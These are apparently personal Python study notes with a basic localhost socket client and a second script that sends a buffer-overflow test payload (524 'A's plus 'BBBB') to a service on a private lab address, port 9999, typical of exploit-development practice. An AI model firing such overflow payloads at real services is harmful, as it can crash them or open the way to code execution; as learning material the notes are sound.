# Python notes

### 1\) New socket connection

```text
#!/usr/bin/python

# Import socket module 
import socket                
  
# Create a socket object 
try :
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except :
  print ("socket creation failed")         
  
# Define the port on which you want to connect 
port = 12345                
ip = "127.0.0.1"
# connect to the server on local computer 

try : 
  s.connect((ip, port)) 
  # receive data from the server 
  print (s.recv(1024)) 
except : 
  print ("connection failed")

# close the connection 
s.close()
```

sample socket code

```text
#!/usr/bin/python

import socket

junk = 'A'*524
payload = junk + "BBBB"

print payload

try :
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except :
	print ("failed socket connection")

host_ip = "192.168.137.104"
host_port = 9999

try:
	connect = s.connect((host_ip, host_port))
	data = s.recv(1024)
	s.send(payload + '\r\n')
	data = s.recv(1024)

except:
	print ("no")

```

